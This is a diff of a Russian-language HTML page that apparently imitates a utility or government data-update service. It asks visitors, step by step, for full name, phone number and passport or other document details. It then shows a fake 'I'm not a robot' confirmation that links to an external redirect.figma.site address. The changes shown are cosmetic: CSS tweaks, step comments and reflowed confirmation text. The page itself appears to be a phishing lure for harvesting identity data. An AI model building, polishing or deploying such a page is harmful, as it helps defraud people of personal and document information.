@@ -8,11 +8,12 @@
     .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
     h2 { text-align: center; }
     .hidden { display: none; }
-    .btn { display: block; width: 100%; margin: 5px 0; padding: 10px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    .btn { display: block; width: 100%; margin: 5px 0; padding: 10px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; text-align: center; font-size: 16px; }
     .btn:hover { background: #45a049; }
     .back { background: #777; }
     input { width: 95%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
     .faq, .services { margin-top: 10px; }
+    .confirm-text { text-align: center; line-height: 1.6; display: flex; flex-direction: column; gap: 5px; }
   </style>
 </head>
 <body>
@@ -26,6 +27,7 @@
       <button class="btn" onclick="showServices()">🛠️ Дополнительные услуги</button>
     </div>
 
+    <!-- шаг 1 -->
     <div id="form-step1" class="hidden">
       <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
       <label>ФИО:</label>
@@ -34,6 +36,7 @@
       <button class="btn back" onclick="goHome()">↩️ Вернуться назад</button>
     </div>
 
+    <!-- шаг 2 -->
     <div id="form-step2" class="hidden">
       <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
       <label>Телефон (+7...):</label>
@@ -42,6 +45,7 @@
       <button class="btn back" onclick="backStep(1)">↩️ Вернуться назад</button>
     </div>
 
+    <!-- шаг 3 -->
     <div id="form-step3" class="hidden">
       <p>Выберите документ:</p>
       <button class="btn" onclick="chooseDoc('Паспорт')">📄 Паспорт</button>
@@ -50,6 +54,7 @@
       <button class="btn back" onclick="backStep(2)">↩️ Вернуться назад</button>
     </div>
 
+    <!-- шаг 4 -->
     <div id="form-step4" class="hidden">
       <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
       <label id="doc-label"></label>
@@ -58,13 +63,18 @@
       <button class="btn back" onclick="backStep(3)">↩️ Вернуться назад</button>
     </div>
 
+    <!-- финальный шаг -->
     <div id="confirm" class="hidden">
-      <p>❗️Последний шаг❗️<br>
-        Для обновления данных подтвердите, что вы человек 👇</p>
+      <div class="confirm-text">
+        <span>❗ Последний шаг ❗</span>
+        <span>Для обновления данных подтвердите,</span>
+        <span>что вы человек 👇</span>
+      </div>
       <a class="btn" href="https://redirect.figma.site/" target="_blank">Я не робот ✅</a>
       <button class="btn back" onclick="goHome()">🏠 Главное меню</button>
     </div>
 
+    <!-- сервисы -->
     <div id="services" class="hidden">
       <h3>🛠️ Дополнительные услуги</h3>
       <button class="btn" onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
@@ -73,6 +83,7 @@
       <button class="btn back" onclick="goHome()">↩️ Вернуться назад</button>
     </div>
 
+    <!-- FAQ -->
     <div id="faq" class="hidden">
       <h3>❓ Вопросы</h3>
       <p>⏳ До какого числа нужно передавать показания? — До 25 числа каждого месяца.</p>
@@ -84,6 +95,7 @@
       <button class="btn back" onclick="showServices()">↩️ Вернуться назад</button>
     </div>
 
+    <!-- инструкция -->
     <div id="instruction" class="hidden">
       <h3>ℹ️ Инструкция</h3>
       <p>📋 Чтобы обновить данные:<br>
